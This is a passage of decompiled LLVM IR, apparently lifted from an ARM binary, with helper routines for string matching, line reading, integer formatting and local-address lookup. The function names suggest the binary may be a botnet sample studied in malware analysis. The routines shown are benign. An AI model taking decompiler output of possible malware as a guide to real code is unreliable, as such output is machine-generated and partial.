  %v3_10d70 = or i1 %v7_10d68, %v2_10d70
  br i1 %v3_10d70, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_10d80 = phi i32 [ %v0_10d8015, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_10d6c, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_10d78 = icmp ugt i32 %v1_10d58, 24
  %v11_10d78 = icmp eq i32 %v1_10d58, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_10d7c = phi i1 [ %v7_10d68, %bb58 ], [ %v11_10d78, %bb59 ]
  %v0_10d7c = phi i1 [ %v2_10d68, %bb58 ], [ %v6_10d78, %bb59 ]
  %v2_10d7c = xor i1 %v1_10d7c, true
  %v3_10d7c = and i1 %v0_10d7c, %v2_10d7c
  br i1 %v3_10d7c, label %dec_label_pc_10de0, label %dec_label_pc_10d80

dec_label_pc_10d80:                               ; preds = %bb60
  %v2_10d80 = icmp eq i32 %v0_10d80, 0
  %. = select i1 %v2_10d80, i32 87, i32 55
  %v2_10d8c = sub nsw i32 %v1_10d8c, %.
  br label %dec_label_pc_10d90

dec_label_pc_10d90:                               ; preds = %dec_label_pc_10d4c, %dec_label_pc_10d80
  %v0_10da433 = phi i32 [ %v1_10d60, %dec_label_pc_10d4c ], [ %., %dec_label_pc_10d80 ]
  %v3_10dc8 = phi i32 [ %v1_10d5c, %dec_label_pc_10d4c ], [ %v2_10d8c, %dec_label_pc_10d80 ]
  %v2_10d90 = sub i32 %v3_10dc8, %arg2
  %v4_10d90 = xor i32 %v3_10dc8, %arg2
  %v5_10d90 = xor i32 %v2_10d90, %v3_10dc8
  %v6_10d90 = and i32 %v5_10d90, %v4_10d90
  %v7_10d90 = icmp slt i32 %v6_10d90, 0
  %v8_10d90 = icmp slt i32 %v2_10d90, 0
  %v2_10d94 = xor i1 %v8_10d90, %v7_10d90
  br i1 %v2_10d94, label %dec_label_pc_10d98, label %dec_label_pc_10de0

dec_label_pc_10d98:                               ; preds = %dec_label_pc_10d90
  br i1 %v3_10d9c, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_10d98
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_10d98, %bb63
  %v0_10da432 = phi i32 [ %v0_10da433, %dec_label_pc_10d98 ], [ 0, %bb63 ]
  br i1 %v3_10da0, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_10da4 = phi i32 [ %v0_10da432, %bb64 ], [ 1, %bb65 ]
  %tmp88 = icmp slt i32 %v1_10da4, 0
  %v4_10da4 = zext i1 %tmp88 to i32
  %v5_10da4 = or i32 %v0_10da4, %v4_10da4
  %v7_10da4 = icmp eq i32 %v5_10da4, 0
  br i1 %v7_10da4, label %dec_label_pc_10dac, label %dec_label_pc_10dd4

dec_label_pc_10dac:                               ; preds = %bb66
  %v2_10db8 = sub i32 %v3_10dc8, %v3_10d2c
  %v4_10db8 = xor i32 %v3_10dc8, %v3_10d2c
  %v5_10db8 = xor i32 %v2_10db8, %v3_10dc8
  %v6_10db8 = and i32 %v5_10db8, %v4_10db8
  %v7_10db8 = icmp slt i32 %v6_10db8, 0
  %v8_10db8 = icmp slt i32 %v2_10db8, 0
  %v9_10db8 = icmp eq i32 %v3_10dc8, %v3_10d2c
  %v3_10dbc = xor i1 %v8_10db8, %v7_10db8
  %v4_10dbc = or i1 %v9_10db8, %v3_10dbc
  br i1 %v4_10dbc, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_10dac
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_10dac
  br i1 %v2_10dc0, label %.thread5, label %dec_label_pc_10dd4

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_10dc8 = mul i32 %v2_10dc8.ph, %arg2
  %v5_10dc8 = add i32 %v3_10dc8, %v4_10dc8
  %v2_10dcc = inttoptr i32 %v1_10dcc to i8*
  %v3_10dcc = load i8, i8* %v2_10dcc, align 1
  %v6_10dcc = add i32 %v1_10dcc, 1
  br label %dec_label_pc_10d4c.outer

dec_label_pc_10dd4:                               ; preds = %thread-pre-split, %bb66
  %v1_10dd4 = inttoptr i32 %v1_10dcc to i8*
  %v2_10dd4 = load i8, i8* %v1_10dd4, align 1
  %v5_10dd4 = add i32 %v1_10dcc, 1
  br label %dec_label_pc_10d4c

dec_label_pc_10de0:                               ; preds = %dec_label_pc_10d90, %bb60
  %v1_10de0 = icmp slt i32 %v1_10da4, 0
  %v2_10e0c = icmp eq i32 %v0_10e0c, 0
  br i1 %v1_10de0, label %dec_label_pc_10e0c, label %dec_label_pc_10de8

dec_label_pc_10de8:                               ; preds = %dec_label_pc_10de0
  br i1 %v2_10e0c, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_10de8
  %v2_10dec = sub i32 0, %v2_10dc8.ph
  br label %bb70

bb70:                                             ; preds = %.thread43, %bb71, %dec_label_pc_10de8, %bb69
  %v1_10df8 = phi i32 [ -2147483648, %bb71 ], [ %v2_10dc8.ph, %dec_label_pc_10de8 ], [ %v2_10dec, %bb69 ], [ 2147483647, %.thread43 ]
  ret i32 %v1_10df8

dec_label_pc_10dfc:                               ; preds = %dec_label_pc_10d0c
  %v1_10dfc = inttoptr i32 %v5_10cf0 to i8*
  %v2_10dfc = load i8, i8* %v1_10dfc, align 1
  %v5_10dfc = add i32 %v0_10cf0, 2
  br label %dec_label_pc_10d24

dec_label_pc_10e0c:                               ; preds = %dec_label_pc_10de0
  br i1 %v2_10e0c, label %.thread43, label %bb71

.thread43:                                        ; preds = %dec_label_pc_10e0c
  br label %bb70

bb71:                                             ; preds = %dec_label_pc_10e0c
  br label %bb70

; uselistorder directives
  uselistorder i1 %v2_10e0c, { 1, 0 }
  uselistorder i32 %v2_10db8, { 1, 0 }
  uselistorder i32 %v2_10d90, { 1, 0 }
  uselistorder i32 %v3_10dc8, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_10d68, { 1, 2, 0 }
  uselistorder i1 %v2_10d68, { 1, 0, 2 }
  uselistorder i32 %v1_10d4c, { 1, 2, 0 }
  uselistorder i32 %v1_10d8c, { 1, 0, 2 }
  uselistorder i32 %v1_10da4, { 1, 0 }
  uselistorder i32 %v1_10dcc, { 2, 3, 1, 0 }
  uselistorder i1 %v9_10d98, { 1, 0, 2 }
  uselistorder i1 %v3_10d98, { 1, 0 }
  uselistorder i32 %v2_10dc8.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v3_10d2c, { 1, 0, 2 }
  uselistorder i32 %v2_10d2c, { 1, 0 }
  uselistorder i32 %v5_10cf0, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_10cf0, { 0, 1, 3, 2 }
  uselistorder i32 25, { 14, 15, 8, 2, 3, 0, 9, 4, 10, 1, 11, 5, 6, 12, 7, 13 }
  uselistorder i8 32, { 8, 9, 10, 11, 12, 13, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i8 9, { 2, 0, 1 }
  uselistorder label %bb70, { 1, 0, 3, 2 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_10d90, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_10d4c, { 1, 0 }
  uselistorder label %dec_label_pc_10d24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10cf0, { 1, 2, 0, 3 }
}

define i32 @util_fdgets(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_10e1c = load i32, i32* @r4, align 4
  store i32 %v3_10e1c, i32* %stack_var_-24, align 4
  %v6_10e1c = load i32, i32* @r5, align 4
  %v9_10e1c = load i32, i32* @r6, align 4
  %v12_10e1c = load i32, i32* @r7, align 4
  %v15_10e1c = load i32, i32* @r8, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_10e34

dec_label_pc_10e34:                               ; preds = %dec_label_pc_10e58.dec_label_pc_10e34_crit_edge, %entry
  %v0_10e38 = phi i32 [ %v0_10e38.pre, %dec_label_pc_10e58.dec_label_pc_10e34_crit_edge ], [ %arg3, %entry ]
  %v0_10e34 = phi i32 [ %v5_10e58, %dec_label_pc_10e58.dec_label_pc_10e34_crit_edge ], [ %tmp, %entry ]
  store i32 %v0_10e34, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_10e40 = call i32 @__libc_read(i32 %v0_10e38)
  %v7_10e44 = icmp eq i32 %v1_10e40, 1
  %v0_10e4c = load i32, i32* @r5, align 4
  br i1 %v7_10e44, label %dec_label_pc_10e4c, label %dec_label_pc_10e64

dec_label_pc_10e4c:                               ; preds = %dec_label_pc_10e34
  %v1_10e4c = add i32 %v0_10e4c, 1
  store i32 %v1_10e4c, i32* @r5, align 4
  %v1_10e50 = load i32, i32* @r8, align 4
  %v6_10e54 = icmp slt i32 %v1_10e4c, %v1_10e50
  br i1 %v6_10e54, label %dec_label_pc_10e58, label %.loopexit

dec_label_pc_10e58:                               ; preds = %dec_label_pc_10e4c
  %v0_10e58 = load i32, i32* @r4, align 4
  %v1_10e58 = inttoptr i32 %v0_10e58 to i8*
  %v2_10e58 = load i8, i8* %v1_10e58, align 1
  %v3_10e58 = zext i8 %v2_10e58 to i32
  store i32 %v3_10e58, i32* @r3, align 4
  %v5_10e58 = add i32 %v0_10e58, 1
  store i32 %v5_10e58, i32* @r4, align 4
  %v7_10e5c = icmp eq i8 %v2_10e58, 10
  br i1 %v7_10e5c, label %dec_label_pc_10e64, label %dec_label_pc_10e58.dec_label_pc_10e34_crit_edge

dec_label_pc_10e58.dec_label_pc_10e34_crit_edge:  ; preds = %dec_label_pc_10e58
  %v0_10e38.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_10e34

dec_label_pc_10e64:                               ; preds = %dec_label_pc_10e34, %dec_label_pc_10e58
  %v0_10e64 = phi i32 [ %v1_10e4c, %dec_label_pc_10e58 ], [ %v0_10e4c, %dec_label_pc_10e34 ]
  %v2_10e64 = icmp eq i32 %v0_10e64, 0
  br i1 %v2_10e64, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_10e64
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_10e4c, %dec_label_pc_10e64, %bb
  %v0_10e6c = load i32, i32* @r7, align 4
  %v2_10e70 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10e70, i32* @r4, align 4
  store i32 %v6_10e1c, i32* @r5, align 4
  store i32 %v9_10e1c, i32* @r6, align 4
  store i32 %v12_10e1c, i32* @r7, align 4
  store i32 %v15_10e1c, i32* @r8, align 4
  ret i32 %v0_10e6c

; uselistorder directives
  uselistorder i32 %v5_10e58, { 1, 0 }
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10e64, { 1, 0 }
}

define i32 @util_local_addr() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_10e78 = load i32, i32* @r4, align 4
  %v6_10e78 = load i32, i32* @r5, align 4
  %v9_10e78 = load i32, i32* @r6, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_10e88 = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10e90 = inttoptr i32 %v0_10e88 to i32*
  store i32 0, i32* %v2_10e90, align 4
  %v0_10e9c = load i32, i32* %r4.global-to-local, align 4
  %v3_10ea0 = call i32 @socket(i32 2, i32 2, i32 %v0_10e9c)
  %v7_10ea4 = icmp eq i32 %v3_10ea0, -1
  store i32 %v3_10ea0, i32* @r5, align 4
  br i1 %v7_10ea4, label %bb, label %dec_label_pc_10eb4

bb:                                               ; preds = %entry
  %v1_10eac = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10f00

dec_label_pc_10eb4:                               ; preds = %entry
  %v2_10ec0 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10ec0, i32* @r4, align 4
  %v0_10ecc = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_10ee0 = call i32 @__libc_connect(i32 %v3_10ea0, i32 %v2_10ec0, i32 %v0_10ecc)
  store i32 %v2_10ec0, i32* @r1, align 4
  %v2_10ee8 = ptrtoint i32* %stack_var_-20 to i32
  %v0_10eec = load i32, i32* @r5, align 4
  %v3_10ef0 = call i32 @__GI_getsockname(i32 %v0_10eec, i32 %v2_10ec0, i32 %v2_10ee8)
  %v0_10ef4 = load i32, i32* @r5, align 4
  %v1_10ef8 = call i32 @__GI___libc_close(i32 %v0_10ef4)
  br label %dec_label_pc_10f00

dec_label_pc_10f00:                               ; preds = %bb, %dec_label_pc_10eb4
  %storemerge = phi i32 [ 134744072, %dec_label_pc_10eb4 ], [ %v1_10eac, %bb ]
  store i32 %v3_10e78, i32* @r4, align 4
  store i32 %v6_10e78, i32* @r5, align 4
  store i32 %v9_10e78, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_10ec0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10ea0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 7, 9, 1, 8, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 25, 27, 24, 4, 26, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 0, 10, 9, 8, 7, 6, 5, 1, 3, 2 }
  uselistorder i32 ()* @__GI___errno_location, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10f00, { 1, 0 }
}

define i32 @util_stristr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_10f10 = load i8, i8* %tmp, align 1
  %v4_10f10 = zext i8 %v3_10f10 to i32
  store i32 %v4_10f10, i32* @r3, align 4
  %v2_10f14 = icmp eq i8 %v3_10f10, 0
  br i1 %v2_10f14, label %bb, label %dec_label_pc_10f28

bb:                                               ; preds = %entry
  br label %dec_label_pc_10f3c

dec_label_pc_10f28:                               ; preds = %entry
  br label %dec_label_pc_10f2c

dec_label_pc_10f2c:                               ; preds = %dec_label_pc_10f2c, %dec_label_pc_10f28
  %v0_10f2c = phi i32 [ %v1_10f2c, %dec_label_pc_10f2c ], [ 0, %dec_label_pc_10f28 ]
  %v1_10f2c = add i32 %v0_10f2c, 1
  %v2_10f30 = add i32 %v1_10f2c, %arg2
  %v3_10f30 = inttoptr i32 %v2_10f30 to i8*
  %v4_10f30 = load i8, i8* %v3_10f30, align 1
  %v6_10f30 = zext i8 %v4_10f30 to i32
  store i32 %v6_10f30, i32* @r3, align 4
  %v2_10f34 = icmp eq i8 %v4_10f30, 0
  br i1 %v2_10f34, label %dec_label_pc_10f3c, label %dec_label_pc_10f2c

dec_label_pc_10f3c:                               ; preds = %dec_label_pc_10f2c, %bb
  %v0_10f8021 = phi i32 [ %v4_10f10, %bb ], [ %v1_10f2c, %dec_label_pc_10f2c ]
  %v0_10f442 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_10f442, 1
  br i1 %tmp29, label %dec_label_pc_10f94, label %dec_label_pc_10f50

dec_label_pc_10f50:                               ; preds = %dec_label_pc_10f3c, %dec_label_pc_10f44.backedge
  %v0_10f48.in = phi i32 [ %v0_10f48, %dec_label_pc_10f44.backedge ], [ %v0_10f442, %dec_label_pc_10f3c ]
  %v1_10f5c = phi i32 [ %v1_10f5c15, %dec_label_pc_10f44.backedge ], [ 0, %dec_label_pc_10f3c ]
  %v0_10f50 = phi i32 [ %v5_10f50, %dec_label_pc_10f44.backedge ], [ %tmp23, %dec_label_pc_10f3c ]
  %v0_10f48 = add i32 %v0_10f48.in, -1
  %v1_10f50 = inttoptr i32 %v0_10f50 to i8*
  %v2_10f50 = load i8, i8* %v1_10f50, align 1
  %v3_10f50 = zext i8 %v2_10f50 to i32
  %v5_10f50 = add i32 %v0_10f50, 1
  %v1_10f54 = add nsw i32 %v3_10f50, -65
  %v2_10f5c = add i32 %v1_10f5c, %arg2
  %v3_10f5c = inttoptr i32 %v2_10f5c to i8*
  %v4_10f5c = load i8, i8* %v3_10f5c, align 1
  %v6_10f5c = zext i8 %v4_10f5c to i32
  store i32 %v6_10f5c, i32* @r3, align 4
  %v1_10f60 = add nsw i32 %v6_10f5c, -65
  %tmp38 = icmp ult i32 %v1_10f54, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_10f50
  %v5_10f64 = or i32 %v3_10f50, 96
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_10f50, %bb30
  %v0_10f70 = phi i32 [ %v3_10f50, %dec_label_pc_10f50 ], [ %v5_10f64, %bb30 ]
  %tmp39 = icmp ult i32 %v1_10f60, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_10f6c = or i32 %v6_10f5c, 96
  store i32 %v5_10f6c, i32* @r3, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_10f70 = phi i32 [ %v6_10f5c, %bb31 ], [ %v5_10f6c, %bb32 ]
  %v9_10f70 = icmp eq i32 %v0_10f70, %v1_10f70
  br i1 %v9_10f70, label %dec_label_pc_10f7c, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_10f44.backedge

dec_label_pc_10f44.backedge:                      ; preds = %bb34, %dec_label_pc_10f7c
  %v1_10f5c15 = phi i32 [ 0, %bb34 ], [ %v1_10f7c, %dec_label_pc_10f7c ]
  %tmp35 = icmp slt i32 %v0_10f48, 1
  br i1 %tmp35, label %dec_label_pc_10f94, label %dec_label_pc_10f50

dec_label_pc_10f7c:                               ; preds = %bb33
  %v1_10f7c = add i32 %v1_10f5c, 1
  %v9_10f80 = icmp eq i32 %v0_10f8021, %v1_10f7c
  br i1 %v9_10f80, label %dec_label_pc_10f88, label %dec_label_pc_10f44.backedge

dec_label_pc_10f88:                               ; preds = %dec_label_pc_10f7c
  %v2_10f88 = sub i32 %v5_10f50, %tmp23
  br label %dec_label_pc_10f94

dec_label_pc_10f94:                               ; preds = %dec_label_pc_10f44.backedge, %dec_label_pc_10f3c, %dec_label_pc_10f88
  %storemerge = phi i32 [ %v2_10f88, %dec_label_pc_10f88 ], [ -1, %dec_label_pc_10f3c ], [ -1, %dec_label_pc_10f44.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10f7c, { 1, 0 }
  uselistorder i32 %v0_10f50, { 1, 0 }
  uselistorder i32 %v1_10f5c, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 5, 2, 6, 3, 7, 4, 8 }
  uselistorder label %dec_label_pc_10f94, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10f44.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_10f50, { 1, 0 }
}

define i32 @util_strcmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_10f9c = load i8, i8* %arg1, align 1
  %v2_10fa0 = icmp eq i8 %v2_10f9c, 0
  br i1 %v2_10fa0, label %bb, label %dec_label_pc_10fac

bb:                                               ; preds = %entry
  %v3_10f9c = zext i8 %v2_10f9c to i32
  br label %dec_label_pc_10fc0

dec_label_pc_10fac:                               ; preds = %entry
  br label %dec_label_pc_10fb0

dec_label_pc_10fb0:                               ; preds = %dec_label_pc_10fb0, %dec_label_pc_10fac
  %v0_10fb0 = phi i32 [ %v1_10fb0, %dec_label_pc_10fb0 ], [ 0, %dec_label_pc_10fac ]
  %v1_10fb0 = add i32 %v0_10fb0, 1
  %v2_10fb4 = add i32 %v1_10fb0, %tmp
  %v3_10fb4 = inttoptr i32 %v2_10fb4 to i8*
  %v4_10fb4 = load i8, i8* %v3_10fb4, align 1
  %v2_10fb8 = icmp eq i8 %v4_10fb4, 0
  br i1 %v2_10fb8, label %dec_label_pc_10fc0, label %dec_label_pc_10fb0

dec_label_pc_10fc0:                               ; preds = %dec_label_pc_10fb0, %bb
  %v0_1100c3 = phi i32 [ %v3_10f9c, %bb ], [ %v1_10fb0, %dec_label_pc_10fb0 ]
  %v1_10fc0 = inttoptr i32 %arg2 to i8*
  %v2_10fc0 = load i8, i8* %v1_10fc0, align 1
  %v3_10fc0 = zext i8 %v2_10fc0 to i32
  store i32 %v3_10fc0, i32* @r3, align 4
  %v2_10fc4 = icmp eq i8 %v2_10fc0, 0
  br i1 %v2_10fc4, label %bb21, label %dec_label_pc_10fd0

bb21:                                             ; preds = %dec_label_pc_10fc0
  store i32 %v3_10fc0, i32* @r2, align 4
  br label %dec_label_pc_10fe4

dec_label_pc_10fd0:                               ; preds = %dec_label_pc_10fc0
  br label %dec_label_pc_10fd4

dec_label_pc_10fd4:                               ; preds = %dec_label_pc_10fd4, %dec_label_pc_10fd0
  %v0_10fd4 = phi i32 [ %v1_10fd4, %dec_label_pc_10fd4 ], [ 0, %dec_label_pc_10fd0 ]
  %v1_10fd4 = add i32 %v0_10fd4, 1
  store i32 %v1_10fd4, i32* @r2, align 4
  %v2_10fd8 = add i32 %v1_10fd4, %arg2
  %v3_10fd8 = inttoptr i32 %v2_10fd8 to i8*
  %v4_10fd8 = load i8, i8* %v3_10fd8, align 1
  %v6_10fd8 = zext i8 %v4_10fd8 to i32
  store i32 %v6_10fd8, i32* @r3, align 4
  %v2_10fdc = icmp eq i8 %v4_10fd8, 0
  br i1 %v2_10fdc, label %dec_label_pc_10fe4, label %dec_label_pc_10fd4

dec_label_pc_10fe4:                               ; preds = %dec_label_pc_10fd4, %bb21
  %v0_10fe4 = phi i32 [ %v3_10fc0, %bb21 ], [ %v1_10fd4, %dec_label_pc_10fd4 ]
  %v9_10fe4 = icmp eq i32 %v0_10fe4, %v0_1100c3
  br i1 %v9_10fe4, label %dec_label_pc_1100c.preheader, label %dec_label_pc_10fec

dec_label_pc_1100c.preheader:                     ; preds = %dec_label_pc_10fe4
  %v2_1100c5 = icmp eq i32 %v0_1100c3, 0
  br i1 %v2_1100c5, label %dec_label_pc_11014, label %dec_label_pc_10ff4

dec_label_pc_10fec:                               ; preds = %dec_label_pc_10ff4, %dec_label_pc_10fe4
  ret i32 0

dec_label_pc_10ff4:                               ; preds = %dec_label_pc_11004, %dec_label_pc_1100c.preheader
  %v0_1100c.in = phi i32 [ %v0_1100c, %dec_label_pc_11004 ], [ %v0_1100c3, %dec_label_pc_1100c.preheader ]
  %v0_11008 = phi i32 [ %v1_11008, %dec_label_pc_11004 ], [ %arg2, %dec_label_pc_1100c.preheader ]
  %v0_11004 = phi i32 [ %v1_11004, %dec_label_pc_11004 ], [ %tmp, %dec_label_pc_1100c.preheader ]
  %v0_1100c = add i32 %v0_1100c.in, -1
  %v1_10ff4 = inttoptr i32 %v0_11004 to i8*
  %v2_10ff4 = load i8, i8* %v1_10ff4, align 1
  %v3_10ff4 = zext i8 %v2_10ff4 to i32
  store i32 %v3_10ff4, i32* @r2, align 4
  %v1_10ff8 = inttoptr i32 %v0_11008 to i8*
  %v2_10ff8 = load i8, i8* %v1_10ff8, align 1
  %v3_10ff8 = zext i8 %v2_10ff8 to i32
  store i32 %v3_10ff8, i32* @r3, align 4
  %v9_10ffc = icmp eq i8 %v2_10ff4, %v2_10ff8
  br i1 %v9_10ffc, label %dec_label_pc_11004, label %dec_label_pc_10fec

dec_label_pc_11004:                               ; preds = %dec_label_pc_10ff4
  %v1_11004 = add i32 %v0_11004, 1
  %v1_11008 = add i32 %v0_11008, 1
  %v2_1100c = icmp eq i32 %v0_1100c, 0
  br i1 %v2_1100c, label %dec_label_pc_11014, label %dec_label_pc_10ff4

dec_label_pc_11014:                               ; preds = %dec_label_pc_11004, %dec_label_pc_1100c.preheader
  ret i32 1

; uselistorder directives
  uselistorder i32 %v1_10fd4, { 0, 1, 3, 2 }
  uselistorder i8 %v2_10f9c, { 1, 0 }
}

define i32 @util_itoa(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = sext i8 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-66 = alloca i32, align 4
  %v0_11020 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_11020, i32* %r8.global-to-local, align 4
  %v2_11020 = icmp eq i32 %v0_11020, 0
  store i1 %v2_11020, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_11020, label %dec_label_pc_11100, label %dec_label_pc_11030

dec_label_pc_11030:                               ; preds = %entry
  %v3_11030 = icmp eq i8 %arg1, 0
  store i1 %v3_11030, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_11030, label %.thread, label %dec_label_pc_11044

.thread:                                          ; preds = %dec_label_pc_11030
  %v4_11038 = inttoptr i32 %v0_11020 to i8*
  store i8 48, i8* %v4_11038, align 1
  %v0_1103c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1103c.pr.pr, label %.thread1, label %dec_label_pc_11044

.thread1:                                         ; preds = %.thread
  %v4_1103c = load i32, i32* %r8.global-to-local, align 4
  %v5_1103c = add i32 %v4_1103c, 1
  %v6_1103c = inttoptr i32 %v5_1103c to i8*
  store i8 0, i8* %v6_1103c, align 1
  %v0_11040.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11040.pr.pr, label %dec_label_pc_11100, label %dec_label_pc_11044

dec_label_pc_11044:                               ; preds = %dec_label_pc_11030, %.thread, %.thread1
  %tmp48 = icmp slt i8 %arg1, 0
  %v7_11048 = icmp eq i32 %arg2, 10
  store i1 %v7_11048, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11048, label %bb, label %.thread29

.thread29:                                        ; preds = %dec_label_pc_11044
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %.thread6

bb:                                               ; preds = %dec_label_pc_11044
  %v4_11044 = zext i1 %tmp48 to i32
  store i32 %v4_11044, i32* %r2.global-to-local, align 4
  %phitmp = icmp eq i1 %tmp48, false
  store i1 %phitmp, i1* %cpsr_z.global-to-local, align 1
  %v3_110688 = sub nsw i32 0, %tmp
  %tmp.v3_110688 = select i1 %phitmp, i32 %tmp, i32 %v3_110688
  %tmp47 = zext i1 %phitmp to i32
  %. = xor i32 %tmp47, 1
  br label %.thread6

.thread6:                                         ; preds = %bb, %.thread29
  %storemerge31 = phi i32 [ %tmp, %.thread29 ], [ %tmp.v3_110688, %bb ]
  %storemerge = phi i32 [ 0, %.thread29 ], [ %., %bb ]
  store i32 %storemerge, i32* %sl.global-to-local, align 4
  store i32 32, i32* %r5.global-to-local, align 4
  %v2_11074 = ptrtoint i32* %stack_var_-66 to i32
  store i32 %v2_11074, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_11078

dec_label_pc_11078:                               ; preds = %bb46, %.thread6
  %v2_11098 = phi i32 [ %v1_110a4, %bb46 ], [ 32, %.thread6 ]
  %v0_1108c = phi i32 [ %v2_1109c, %bb46 ], [ %storemerge31, %.thread6 ]
  %v0_1107c = load i32, i32* %r6.global-to-local, align 4
  %v3_11080 = urem i32 %v0_1108c, %v0_1107c
  store i32 %v3_11080, i32* %r1.global-to-local, align 4
  %v7_11084 = icmp eq i32 %v3_11080, 9
  store i1 %v7_11084, i1* %cpsr_z.global-to-local, align 1
  %v1_11088 = add i32 %v3_11080, 48
  store i32 %v0_1108c, i32* %r0.global-to-local, align 4
  %v7_11090 = icmp sgt i32 %v3_11080, 9
  %extract.t = trunc i32 %v1_11088 to i8
  br i1 %v7_11090, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_11078
  %v9_11090 = add i32 %v3_11080, 55
  %extract.t28 = trunc i32 %v9_11090 to i8
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_11078, %bb45
  %v0_11098.off0 = phi i8 [ %extract.t, %dec_label_pc_11078 ], [ %extract.t28, %bb45 ]
  store i32 %v0_1107c, i32* %r1.global-to-local, align 4
  %v3_11098 = load i32, i32* %r7.global-to-local, align 4
  %v4_11098 = add i32 %v3_11098, %v2_11098
  %v5_11098 = inttoptr i32 %v4_11098 to i8*
  store i8 %v0_11098.off0, i8* %v5_11098, align 1
